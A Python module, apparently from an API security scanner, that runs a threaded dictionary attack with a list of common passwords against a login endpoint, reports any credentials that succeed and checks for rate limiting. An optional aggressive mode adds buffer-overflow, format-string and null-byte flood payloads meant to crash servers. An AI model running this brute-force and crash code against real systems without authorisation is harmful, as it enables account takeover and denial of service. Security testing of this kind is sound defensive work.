from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Real Dictionary Attack / Rate Limit Check.
    """
    username = scenario.config.get("user", "admin")
    
    # 1. Real Common Passwords
    # 1. Real Common Passwords
    passwords = [
        "123456", "password", "12345678", "qwerty", "123456789",
        "12345", "111111", "1234567", "dragon", "admin",
        "welcome", "orange", "password123", "letmein", "monkey",
        "system", "login", "changeme", "sunshine", "princess",
        "charlie", "123123", "1234", "root", "pass", "football", 
        "computer", "george", "1234567890", "master", "shadow", 
        "superman", "jessica", "daniel", "solo", "bebe", "trust", 
        "amanda", "chicken", "hello", "barbie", "trinity", "ashley", 
        "nicole", "secure", "google", "hacker", "freedom", "cookie",
        "database", "pookie", "scout", "ninja", "masterkey",
        "starwars", "pokemon", "williams", "jordan", "killer",
        "bailey", "misty", "simon", "fucker", "fuckyou",
        "000000", "1111", "1212", "7777777", "696969",
        "qazwsx", "zxcvbn", "guest", "user", "manager",
        "sysadmin", "support", "service", "oracle", "apache",
        "tomcat", "postgres", "mysql", "java", "server",
        "abc12345", "test1234", "password01", "admin123", "secret",
        "god", "jesus", "love", "angel", "beautiful"
    ]
    
    # 2. Server Crash Payloads (Buffer Overflow / DoS) - User Request
    if scenario.config.get("aggressive"):
        print("    [!!!] Adding SERVER CRASH Payloads to Brute Force dictionary...")
        passwords.extend([
            "A" * 5000, # Buffer Overflow Attempt (5KB)
            "B" * 20000, # Buffer Overflow Attempt (20KB)
            "'" * 500, # Quote Flooding (SQL/Parser Stress)
            "%s" * 200, # Format String DoS
            "\x00" * 500, # Null Byte Flood
            "\n" * 500, # Newline Flood
        ])
    
    count = len(passwords)
    
    # Pre-check
    check = client.send(scenario.method, scenario.target, json_body={"u": "test", "p": "test"})
    if check.status_code in [404, 405]:
        if scenario.config.get("aggressive"):
             print(f"    [AGGRESSIVE] FORCE-ATTACK: Ignoring status {check.status_code} on {scenario.target}. Launching full dictionary attack.")
        else:
             return {
                "scenario_id": scenario.id,
                "attack_type": "brute_force",
                "passed": True,
                "skipped": True,
                "details": f"Endpoint returned {check.status_code}. Skipping attack."
            }

    responses = []
    success_creds = []
    
    import concurrent.futures
    
    def check_password(pwd):
        try:
            body = {"username": username, "password": pwd}
            resp = client.send(scenario.method, scenario.target, json_body=body)
            
            if resp.status_code != 0:
                responses.append(resp.status_code)
                
                # Check for Successful Login!
                if resp.status_code == 200 and "token" in resp.text.lower():
                    success_creds.append(pwd)
                elif resp.status_code in [302, 301] and "login" not in resp.headers.get("Location", ""):
                     success_creds.append(pwd)
        except Exception:
            pass # Suppress thread errors to prevent engine crash
                 
    # Run in parallel
    # REDUCED THREADS: Nested concurrency can choke the OS.
    # Engine runs 5-10 threads. If each launches 20, we enter 200+ thread territory.
    # Let's keep this sane.
    max_workers = 5
    
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # list() forces execution and catches 'map' exceptions if any propagate
            list(executor.map(check_password, passwords))
    except Exception as e:
        print(f"    [!] Brute Force Partial Error: {e}")

    if success_creds:
         return {
            "scenario_id": scenario.id,
            "attack_type": "brute_force",
            "passed": False,
            "details": f"[CRITICAL] Weak Credentials Found! User: {username}, Passwords: {', '.join(success_creds)}"
        }

    # Rate Limiting Check
    rate_limited = 429 in responses or 403 in responses
    
    details = f"Sent {count} request with common passwords. No Rate Limit detected."
    passed = False # Default fail if no protection
    
    if rate_limited:
        details = "Rate Limiting Protection Active (429/403 Detected)."
        passed = True
    elif all(r == 401 for r in responses):
        # Good, at least it denied access, but did it slow down?
        # For now, if no 429, we flag as potential issue
        details = "No Rate Limit detected (All 401s)."
        passed = False
    elif all(r == 200 for r in responses):
        # API returns 200 for everything? That's bad design usually, or we can't tell failure.
        details = "Endpoint returns 200 OK for all attempts. Ambiguous."
        passed = False
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "brute_force",
        "passed": passed,
        "details": details
    }
